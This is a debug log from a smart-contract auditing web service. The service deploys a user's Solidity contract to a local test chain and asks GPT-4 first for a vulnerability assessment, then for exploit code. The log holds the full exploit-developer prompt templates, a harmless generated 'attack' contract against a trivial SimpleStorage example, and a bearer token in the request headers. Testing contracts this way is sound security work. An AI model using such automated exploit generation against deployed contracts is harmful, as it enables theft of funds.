2025-06-23 07:59:55,987 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:59:55,995 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:59:56,012 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:59:56,022 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 07:59:56,032 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 07:59:56] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 07:59:56,046 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 07:59:56,048 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2Njg0Nzh9.MggwIfW6mRCRjxFf2P876ryzKJeu75qAUakqqsPrQ1o', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 07:59:56,050 - app.api.auth - INFO - Request content type: application/json
2025-06-23 07:59:56,051 - app.api.auth - INFO - Processing JSON request
2025-06-23 07:59:56,054 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:59:56,524 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:59:56,527 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:59:56,529 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:59:56,530 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:59:56,531 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:59:56,534 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 07:59:56] "POST /login HTTP/1.1" 200 -
2025-06-23 08:00:02,937 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:00:02,947 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:00:02,951 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:00:02,955 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 08:00:02,962 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:00:02] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 08:00:02,986 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:00:02,997 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 08:00:03,004 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 08:00:03,009 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmph6fmomdh.sol
2025-06-23 08:00:03,018 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 08:00:03,020 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 08:00:03,029 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-23 08:00:03,031 - app.services.contract_service - WARNING - No contracts compiled
2025-06-23 08:00:03,032 - app.services.contract_service - INFO - Temporary file /tmp/tmph6fmomdh.sol removed
2025-06-23 08:00:03,033 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-23 08:00:03,035 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:00:03,036 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:00:03,037 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:00:03,039 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:00:03,041 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:00:03] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-06-23 08:00:30,375 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 08:00:30,384 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 08:00:30,387 - app.api.auth - INFO - Request content type: application/json
2025-06-23 08:00:30,389 - app.api.auth - INFO - Processing JSON request
2025-06-23 08:00:30,393 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:00:30,812 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:00:30,815 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:00:30,817 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:00:30,818 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:00:30,819 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:00:30,822 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:00:30] "POST /login HTTP/1.1" 200 -
2025-06-23 08:00:32,654 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:00:32,672 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 08:00:32,682 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 08:00:32,687 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpns30p0fx.sol
2025-06-23 08:00:32,697 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 08:00:32,699 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 08:00:32,853 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-23 08:00:34,165 - solcx - INFO - Using solc version 0.8.0
2025-06-23 08:00:34,167 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-23 08:00:34,171 - solcx - INFO - Using solc version 0.8.0
2025-06-23 08:00:35,102 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-06-23 08:00:35,104 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-06-23 08:00:35,598 - app.services.contract_service - INFO - Contract SimpleStorage deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-06-23 08:00:35,601 - app.services.contract_service - INFO - Setting up contract SimpleStorage...
2025-06-23 08:00:38,086 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 08:00:38,564 - app.services.contract_service - INFO - Contract SimpleStorage setup completed
2025-06-23 08:00:38,566 - app.services.contract_service - INFO - Funding contract SimpleStorage for attack testing...
2025-06-23 08:00:38,721 - app.services.contract_service - INFO - Contract SimpleStorage funded
2025-06-23 08:00:38,723 - app.services.contract_service - INFO - Building contract observation...
2025-06-23 08:00:38,912 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-23 08:00:38,914 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-23 08:00:38,915 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-23 08:00:38,925 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-23 08:00:38,949 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-23 08:00:38,951 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-23 08:00:38,952 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-23 08:00:38,953 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-23 08:00:38,954 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-23 08:00:38,957 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 08:00:38,958 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 08:00:38,959 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 08:00:46,292 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 08:00:46,316 - app.modules.attack_generator - INFO - Received response from OpenAI API in 7.36 seconds
2025-06-23 08:00:46,328 - app.modules.attack_generator - INFO - Contract analysis completed in 7.36 seconds
2025-06-23 08:00:46,330 - app.modules.attack_generator - INFO - Vulnerability assessment: - No vulnerabilities related to reentrancy, permission, or unsafe calls are present because the cont...
2025-06-23 08:00:46,333 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-23 08:00:46,337 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 08:00:46,339 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 08:00:46,340 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 08:00:49,471 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 08:00:49,492 - app.modules.attack_generator - INFO - Received response from OpenAI API in 3.15 seconds
2025-06-23 08:00:49,499 - app.modules.attack_generator - INFO - Attack code generation completed in 3.15 seconds
2025-06-23 08:00:49,501 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 329
2025-06-23 08:00:49,504 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 10.51 seconds
2025-06-23 08:00:49,506 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-23 08:00:49,510 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpns30p0fx.sol",\n  "contracts": [\n    {\n      "contract_name": "SimpleStorage",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "name": "get",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "x",\n              "type": "uint256"\n            }\n          ],\n          "name": "set",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "get",\n          "signature": "get()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "set",\n          "signature": "set(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "x",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99994415440000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "get": 456\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract SimpleStorage {\\n    uint256 private storedData;\\n\\n    function set(uint256 x) public {\\n        storedData = x;\\n    }\\n\\n    function get() public view returns (uint256) {\\n        return storedData;\\n    }\\n}\\n",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe contract `SimpleStorage` is a minimalistic storage contract that allows anyone to set and get a single `uint256` value. It does not hold any ETH or user funds, nor does it implement any business logic beyond storing a number. The contract is written in Solidity version 0.8.0.\n\n2. Vulnerability Assessment:  \n- No vulnerabilities related to reentrancy, permission, or unsafe calls are present because the contract does not handle ETH or external calls.  \n- There is no access control on the `set` function, meaning anyone can overwrite the stored value at any time. While this is not necessarily a security vulnerability, it may be undesirable depending on the intended use case.  \n- No arithmetic operations are performed, so no math errors or overflows are possible.  \n- No backdoors or economic exploits exist as the contract does not manage funds or complex logic.\n\n3. Exploitation Requirements:  \n- None. The contract is straightforward and does not hold funds or sensitive logic. The only "issue" is that the stored value can be changed by any user at any time, which is by design or a limitation of the contract\'s simplicity.\n\n---  \n**Summary:**  \n- Solidity version: ^0.8.0  \n- No exploitable vulnerabilities detected.  \n- The contract is a simple storage utility without fund management or business logic.', 'contract_analysis': 'The contract `SimpleStorage` is a minimalistic storage contract that allows anyone to set and get a single `uint256` value. It does not hold any ETH or user funds, nor does it implement any business logic beyond storing a number. The contract is written in Solidity version 0.8.0.\n\n2.', 'vulnerability_assessment': '- No vulnerabilities related to reentrancy, permission, or unsafe calls are present because the contract does not handle ETH or external calls.  \n- There is no access control on the `set` function, meaning anyone can overwrite the stored value at any time. While this is not necessarily a security vulnerability, it may be undesirable depending on the intended use case.  \n- No arithmetic operations are performed, so no math errors or overflows are possible.  \n- No backdoors or economic exploits exist as the contract does not manage funds or complex logic.\n\n3.', 'exploitation_requirements': '- None. The contract is straightforward and does not hold funds or sensitive logic. The only "issue" is that the stored value can be changed by any user at any time, which is by design or a limitation of the contract\'s simplicity.', 'analysis_duration': 7.357174634933472}, 'attack': {'attack_prompt': '\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `SimpleStorage` is a minimalistic storage contract that allows anyone to set and get a single `uint256` value. It does not hold any ETH or user funds, nor does it implement any business logic beyond storing a number. The contract is written in Solidity version 0.8.0.\n\n2.\n\nVulnerability Assessment: - No vulnerabilities related to reentrancy, permission, or unsafe calls are present because the contract does not handle ETH or external calls.  \n- There is no access control on the `set` function, meaning anyone can overwrite the stored value at any time. While this is not necessarily a security vulnerability, it may be undesirable depending on the intended use case.  \n- No arithmetic operations are performed, so no math errors or overflows are possible.  \n- No backdoors or economic exploits exist as the contract does not manage funds or complex logic.\n\n3.\n\nExploitation Requirements: - None. The contract is straightforward and does not hold funds or sensitive logic. The only "issue" is that the stored value can be changed by any user at any time, which is by design or a limitation of the contract\'s simplicity.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named \'attack\', \'exploit\', or \'run\')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n', 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface ISimpleStorage {\n    function set(uint256 _value) external;\n}\n\ncontract SimpleStorageAttack {\n    ISimpleStorage public target;\n\n    constructor(address _target) {\n        target = ISimpleStorage(_target);\n    }\n\n    function attack(uint256 _value) external {\n        target.set(_value);\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface ISimpleStorage {\n    function set(uint256 _value) external;\n}\n\ncontract SimpleStorageAttack {\n    ISimpleStorage public target;\n\n    constructor(address _target) {\n        target = ISimpleStorage(_target);\n    }\n\n    function attack(uint256 _value) external {\n        target.set(_value);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 3.1526620388031006}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpns30p0fx.sol",\n  "contracts": [\n    {\n      "contract_name": "SimpleStorage",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "name": "get",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "x",\n              "type": "uint256"\n            }\n          ],\n          "name": "set",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "get",\n          "signature": "get()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "set",\n          "signature": "set(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "x",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99994415440000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "get": 456\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract SimpleStorage {\\n    uint256 private storedData;\\n\\n    function set(uint256 x) public {\\n        storedData = x;\\n    }\\n\\n    function get() public view returns (uint256) {\\n        return storedData;\\n    }\\n}\\n",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe contract `SimpleStorage` is a minimalistic storage contract that allows anyone to set and get a single `uint256` value. It does not hold any ETH or user funds, nor does it implement any business logic beyond storing a number. The contract is written in Solidity version 0.8.0.\n\n2. Vulnerability Assessment:  \n- No vulnerabilities related to reentrancy, permission, or unsafe calls are present because the contract does not handle ETH or external calls.  \n- There is no access control on the `set` function, meaning anyone can overwrite the stored value at any time. While this is not necessarily a security vulnerability, it may be undesirable depending on the intended use case.  \n- No arithmetic operations are performed, so no math errors or overflows are possible.  \n- No backdoors or economic exploits exist as the contract does not manage funds or complex logic.\n\n3. Exploitation Requirements:  \n- None. The contract is straightforward and does not hold funds or sensitive logic. The only "issue" is that the stored value can be changed by any user at any time, which is by design or a limitation of the contract\'s simplicity.\n\n---  \n**Summary:**  \n- Solidity version: ^0.8.0  \n- No exploitable vulnerabilities detected.  \n- The contract is a simple storage utility without fund management or business logic.', 'reasoning': 'The contract `SimpleStorage` is a minimalistic storage contract that allows anyone to set and get a single `uint256` value. It does not hold any ETH or user funds, nor does it implement any business logic beyond storing a number. The contract is written in Solidity version 0.8.0.\n\n2.', 'summary': '- No vulnerabilities related to reentrancy, permission, or unsafe calls are present because the contract does not handle ETH or external calls.  \n- There is no access control on the `set` function, meaning anyone can overwrite the stored value at any time. While this is not necessarily a security vulnerability, it may be undesirable depending on the intended use case.  \n- No arithmetic operations are performed, so no math errors or overflows are possible.  \n- No backdoors or economic exploits exist as the contract does not manage funds or complex logic.\n\n3.', 'code': 'pragma solidity 0.8.0;\n\ninterface ISimpleStorage {\n    function set(uint256 _value) external;\n}\n\ncontract SimpleStorageAttack {\n    ISimpleStorage public target;\n\n    constructor(address _target) {\n        target = ISimpleStorage(_target);\n    }\n\n    function attack(uint256 _value) external {\n        target.set(_value);\n    }\n}', 'code_type': 'solidity', 'duration': 10.509836673736572}
2025-06-23 08:00:49,514 - app.services.contract_service - INFO - Has exploit code: True
2025-06-23 08:00:49,516 - app.services.contract_service - INFO - No vulnerabilities mentioned: True
2025-06-23 08:00:49,518 - app.services.contract_service - INFO - Summary explicitly states no vulnerabilities, setting status to OK
